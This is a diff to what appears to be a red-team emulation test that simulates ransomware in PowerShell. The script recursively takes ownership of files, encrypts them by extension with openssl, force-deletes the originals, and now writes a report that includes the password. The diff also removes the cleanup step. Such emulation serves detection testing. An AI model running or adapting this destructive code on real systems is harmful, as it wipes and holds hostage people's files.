@@ -72,7 +72,7 @@ atomic_tests:
     dependency_executor_name: powershell
     dependencies:
       - description: |
-          Checks if openssl is installed
+          Checks if OpenSSL is installed
         prereq_command: |
           if (Get-Command openssl -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
         get_prereq_command: |
@@ -91,6 +91,10 @@ atomic_tests:
         $targetDir = "#{target_directory}"
         $extensions = #{target_extensions}
 
+        # Initialize counters and logs
+        $encryptedFiles = @()
+        $nonEncryptedFiles = @()
+
         if (-Not (Test-Path $targetDir)) {
             Write-Host "❌ The target directory $targetDir does not exist."
             exit 1
@@ -99,7 +103,7 @@ atomic_tests:
         Write-Host "✅ Starting encryption process..."
 
         foreach ($ext in $extensions) {
-            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -ne ".enc" } | ForEach-Object {
                 $file = $_.FullName
                 Write-Host "🔍 Processing file: $file"
                 try {
@@ -107,6 +111,7 @@ atomic_tests:
                     icacls $file /grant Administrators:F /T /C | Out-Null
                 } catch {
                     Write-Host "❌ Failed to set permissions for: $file"
+                    $nonEncryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName }
                     return
                 }
 
@@ -117,12 +122,73 @@ atomic_tests:
                 if ($LASTEXITCODE -eq 0) {
                     Remove-Item -Path $file -Force
                     Write-Host "🗑️ Deleted original file: $file"
+                    $encryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName; EncryptedLocation = $encryptedFile }
                 } else {
                     Write-Host "❌ Failed to encrypt: $file"
+                    $nonEncryptedFiles += @{ Name = $_.Name; Location = $_.DirectoryName }
                 }
             }
         }
 
+        # Generate Report
+        $totalFiles = $encryptedFiles.Count + $nonEncryptedFiles.Count
+        $encryptionPercentage = if ($totalFiles -gt 0) { [math]::Round(($encryptedFiles.Count / $totalFiles) * 100, 2) } else { 0 }
+
+        Write-Host "`n=== Final Report ==="
+
+        # Encrypted Files
+        Write-Host "✅ Number of encrypted files: $($encryptedFiles.Count)"
+        if ($encryptedFiles.Count -gt 0) {
+            Write-Host "Encrypted files:"
+            $encryptedFiles | ForEach-Object {
+                Write-Host "- Name: $($_.Name), Original Location: $($_.Location), Encrypted Location: $($_.EncryptedLocation)"
+            }
+        }
+
+        # Non-Encrypted Files
+        Write-Host "❌ Number of non-encrypted files: $($nonEncryptedFiles.Count)"
+        if ($nonEncryptedFiles.Count -gt 0) {
+            Write-Host "Non-encrypted files:"
+            $nonEncryptedFiles | ForEach-Object {
+                Write-Host "- Name: $($_.Name), Location: $($_.Location)"
+            }
+        }
+
+        # Log Encryption Details
+        Write-Host "`n=== Encryption Details ==="
+        Write-Host "Target Directory: $targetDir"
+        Write-Host "Encryption Password: $password"
+        Write-Host "Target Extensions: $($extensions -join ', ')"
+        Write-Host "Total Files Processed: $totalFiles"
+        Write-Host "Encryption Percentage: $encryptionPercentage%"
+
+        # Save Report to File
+        $reportPath = "C:\temp\encryption_report.txt"
+        $reportContent = "== Final Report ==`n"
+        $reportContent += "✅ Number of encrypted files: $($encryptedFiles.Count)`n"
+        $reportContent += "Encrypted files:`n"
+
+        foreach ($file in $encryptedFiles) {
+            $reportContent += "- Name: $($file.Name), Original Location: $($file.Location), Encrypted Location: $($file.EncryptedLocation)`n"
+        }
+
+        $reportContent += "`n❌ Number of non-encrypted files: $($nonEncryptedFiles.Count)`n"
+        $reportContent += "Non-encrypted files:`n"
+
+        foreach ($file in $nonEncryptedFiles) {
+            $reportContent += "- Name: $($file.Name), Location: $($file.Location)`n"
+        }
+
+        $reportContent += "`n=== Encryption Details ===`n"
+        $reportContent += "Target Directory: $targetDir`n"
+        $reportContent += "Encryption Password: $password`n"
+        $reportContent += "Target Extensions: $($extensions -join ', ')`n"
+        $reportContent += "Total Files Processed: $totalFiles`n"
+        $reportContent += "Encryption Percentage: $encryptionPercentage%`n"
+
+        # Write the report content to a file
+        $reportContent | Out-File -FilePath $reportPath -Encoding UTF8
+
+        Write-Host "Report saved to $reportPath"
+
         Write-Host "✅ Encryption and deletion process completed!"
-      cleanup_command: |
-        Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
